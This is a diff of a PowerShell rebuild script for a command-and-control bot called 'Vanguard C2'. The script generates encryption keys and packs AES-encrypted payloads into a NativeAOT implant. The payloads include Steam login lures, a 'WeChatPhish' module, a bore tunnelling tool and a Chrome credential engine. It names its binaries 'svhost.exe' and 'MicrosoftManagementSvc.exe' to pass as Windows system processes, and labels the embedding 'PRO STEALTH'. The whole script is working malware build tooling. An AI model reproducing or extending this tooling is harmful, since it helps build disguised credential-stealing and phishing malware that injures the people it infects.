@@ -1,83 +1,84 @@
-# Vanguard C2: Sentinel Full Rebuild Script
-# Optimized for high-resilience persistence and NativeAOT compilation
+# Vanguard C2: Ultra-Optimized Monolithic Rebuild Script (V7.4)
+$ErrorActionPreference = "Stop"
 
-$BaseDir = Get-Location
-$ConstantsPath = Join-Path $BaseDir "defense\Constants.cs"
-$CsprojPath = Join-Path $BaseDir "FinalBot.csproj"
+Write-Host "================================================" -ForegroundColor Cyan
+Write-Host "   VANGUARD C2: ULTRA-OPTIMIZED BUILD (GZIP)    " -ForegroundColor Cyan
+Write-Host "================================================" -ForegroundColor Cyan
 
-# Ensure directories exist
-if (!(Test-Path "dist")) { $null = New-Item -ItemType Directory -Path "dist" }
-if (!(Test-Path "tools")) { $null = New-Item -ItemType Directory -Path "tools" }
+# Configuration
+$SessionKey = New-Object Byte[] 32
+$MasterKey = New-Object Byte[] 32
+$rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::Create()
+$rng.GetBytes($SessionKey)
+$rng.GetBytes($MasterKey)
 
-Write-Host "[*] Phase 1: Cleaning up old processes..." -ForegroundColor Cyan
+$SessionKeyB64 = [System.Convert]::ToBase64String($SessionKey)
+$MasterKeyB64 = [System.Convert]::ToBase64String($MasterKey)
+
+# Wrap SessionKey with MasterKey (AES-CBC, Zero IV) for Constants.cs
+$aes = [System.Security.Cryptography.Aes]::Create()
+$aes.Key = $MasterKey
+$aes.IV = New-Object Byte[] 16
+$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+$aes.Padding = [System.Security.Cryptography.PaddingMode]::None
+$encryptor = $aes.CreateEncryptor()
+$encSessionKey = $encryptor.TransformFinalBlock($SessionKey, 0, $SessionKey.Length)
+$EncryptedSessionKeyB64 = [System.Convert]::ToBase64String($encSessionKey)
+
+Write-Host "[*] Patching Constants.cs with new synchronized keys..." -ForegroundColor Yellow
+$constantsPath = "defense\Constants.cs"
+$content = Get-Content $constantsPath -Raw
+$content = $content -replace 'public const string MASTER_KEY_B64 = ".*?";', "public const string MASTER_KEY_B64 = `"$MasterKeyB64`";"
+$content = $content -replace 'public const string ENCRYPTED_SESSION_KEY_B64 = ".*?";', "public const string ENCRYPTED_SESSION_KEY_B64 = `"$EncryptedSessionKeyB64`";"
+Set-Content $constantsPath $content
+
+Write-Host "[*] Phase 1: Nuclear Cleanup..." -ForegroundColor Yellow
+Get-Process "svhost" -ErrorAction SilentlyContinue | Stop-Process -Force
 Get-Process "MicrosoftManagementSvc" -ErrorAction SilentlyContinue | Stop-Process -Force
-Get-Process "SteamLogin" -ErrorAction SilentlyContinue | Stop-Process -Force
-Get-Process "MsDiscordSvc" -ErrorAction SilentlyContinue | Stop-Process -Force
+Remove-Item -Path "DiscordProSvc\bin", "DiscordProSvc\obj", "bin", "obj", "dist", "svhost.bin", "scripts\publish" -Recurse -Force -ErrorAction SilentlyContinue
+if (!(Test-Path "dist")) { New-Item -ItemType Directory -Path "dist" | Out-Null }
 
-Write-Host "[*] Phase 2: Compiling Python modules to EXE (PyInstaller)..." -ForegroundColor Cyan
-# [SKIP] PyInstaller build skipped for dev; using existing dist binaries if present.
+Write-Host "[*] Phase 2: Building Resource Packer (Self-Contained)..." -ForegroundColor Cyan
+dotnet publish scripts\ResourcePacker.csproj -c Release -r win-x64 --self-contained true -o scripts\publish --nologo
+if ($LASTEXITCODE -ne 0) { throw "ResourcePacker Compilation FAILED!" }
+$PackerExe = Join-Path (Get-Location).Path "scripts\publish\ResourcePacker.exe"
 
-Write-Host "[*] Phase 3: Synchronizing Encryption Salts..." -ForegroundColor Cyan
-$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
-$bytes = New-Object byte[] 32
-$rng.GetBytes($bytes)
-$MasterKeyB64 = [Convert]::ToBase64String($bytes)
-$bytes = New-Object byte[] 32
-$rng.GetBytes($bytes)
-$SessionKeyB64 = [Convert]::ToBase64String($bytes)
+Write-Host "[*] Phase 3: Building Discord Pro Svc (NativeAOT)..." -ForegroundColor Cyan
+dotnet publish DiscordProSvc\DiscordProSvc.csproj -c Release -r win-x64 -p:PublishAot=true --nologo
+if ($LASTEXITCODE -ne 0) { throw "DiscordProSvc Build FAILED!" }
 
-# [V6.2 HARDENING] Wrap the Session Key using the Master Key via Python cryptoservice
-$WrappedKeyB64 = (python scripts\encrypt_gcm.py wrap $SessionKeyB64 $MasterKeyB64).Trim()
+$SvcPath = "DiscordProSvc\bin\Release\net8.0-windows\win-x64\publish\DiscordProSvc.exe"
+Copy-Item $SvcPath "dist\svhost.exe" -Force
 
-if (Test-Path $ConstantsPath) {
-    $Content = Get-Content $ConstantsPath -Raw
-    $Content = [regex]::Replace($Content, 'public const string MASTER_KEY_B64 = ".*?";', "public const string MASTER_KEY_B64 = `"$MasterKeyB64`";")
-    $Content = [regex]::Replace($Content, 'public const string ENCRYPTED_SESSION_KEY_B64 = ".*?";', "public const string ENCRYPTED_SESSION_KEY_B64 = `"$WrappedKeyB64`";")
-    Set-Content $ConstantsPath $Content
-    Write-Host "    [+] Synced Master & Encrypted Session Key." -ForegroundColor Green
+Write-Host "[*] Phase 4: Compressing & Encrypting Resources..." -ForegroundColor Cyan
+& $PackerExe "dist\svhost.exe" "svhost.bin" $SessionKeyB64
+
+if (!(Test-Path "svhost.bin")) {
+    throw "Critical Resource Error: svhost.bin was NOT created by the packer!"
 }
 
-# 4. Encryption Loop
-$FilesToEncrypt = @("dist\SteamLogin.exe", "dist\MsDiscordSvc.exe", "dist\SteamAlert.exe", "tools\bore.exe")
-foreach ($file in $FilesToEncrypt) {
-    if (Test-Path $file) {
-        $binFile = $file -replace "\.exe", ".bin"
-        Copy-Item -Path $file -Destination $binFile -Force
-        python scripts\encrypt_gcm.py encrypt $binFile $SessionKeyB64
-        Write-Host "    [+] AES-GCM Encrypted $(Split-Path $file -Leaf)" -ForegroundColor Green
-        
-        # [PRO STEALTH] Copy encrypted .bin to root for csproj EmbeddedResource inclusion
-        $rootBin = Join-Path $BaseDir (Split-Path $binFile -Leaf)
-        Copy-Item -Path $binFile -Destination $rootBin -Force
-    } else {
-        Write-Host "    [!] Warning: $file not found, skipping encryption." -ForegroundColor Yellow
+# Pack other large resources if they exist
+$OtherResources = @(
+    @{ Src = "tools\SteamAlert.exe"; Dest = "SteamAlert.bin" },
+    @{ Src = "tools\SteamLogin.exe"; Dest = "SteamLogin.bin" },
+    @{ Src = "Modules\WeChat.exe";   Dest = "WeChatPhish.bin" }
+)
+
+foreach ($res in $OtherResources) {
+    if (Test-Path $res.Src) {
+        & $PackerExe $res.Src $res.Dest $SessionKeyB64
     }
 }
 
-Write-Host "[*] Phase 4: Building C# C2 (NativeAOT)..." -ForegroundColor Cyan
+Write-Host "[*] Phase 5: Final Monolithic AOT Build..." -ForegroundColor Cyan
+dotnet publish FinalBot.csproj -c Release -r win-x64 -p:PublishAot=true --nologo
+if ($LASTEXITCODE -ne 0) { throw "Core Engine Build FAILED!" }
 
-# V6.18: Build the Native ChromElevator Engine first (Statically Linked)
-if (Test-Path "tools\chromelevator\make.bat") {
-    Write-Host "    [>] Building Native ChromeEngine (Static Lib)..." -ForegroundColor Gray
-    Push-Location "tools\chromelevator"
-    cmd.exe /c "make.bat build_lib"
-    Pop-Location
-}
+$FinalExe = "bin\Release\net8.0-windows\win-x64\publish\MicrosoftManagementSvc.exe"
+Write-Host "`n[SUCCESS] Ultra-Optimized build complete!" -ForegroundColor Green
+Write-Host "[+] Binary: $FinalExe" -ForegroundColor White
+$Size = (Get-Item $FinalExe).Length / 1MB
+Write-Host "[+] Final Size: $('{0:N2}' -f $Size) MB" -ForegroundColor Yellow
 
-dotnet publish $CsprojPath -c Release -r win-x64 -p:PublishAot=true --nologo
-
-if ($LASTEXITCODE -eq 0) {
-    $PublishDir = ".\bin\Release\net8.0-windows\win-x64\publish\"
-    $FinalExe = Join-Path $PublishDir "MicrosoftManagementSvc.exe"
-    
-    if (Test-Path "GlobalLogger.py") {
-        Copy-Item -Path "GlobalLogger.py" -Destination $PublishDir -Force
-    }
-
-    # [PRO STEALTH] bore.bin is now EMBEDDED, no need to copy to publish folder.
-
-    Write-Host "`n[SUCCESS] Full rebuild complete!" -ForegroundColor Green
-    Write-Host "[+] Binary location: $FinalExe" -ForegroundColor Green
-} else {
-    Write-Error "C# Build FAILED!"
-}
+# Final Cleanup
+Remove-Item dist, scripts\publish -Recurse -Force -ErrorAction SilentlyContinue
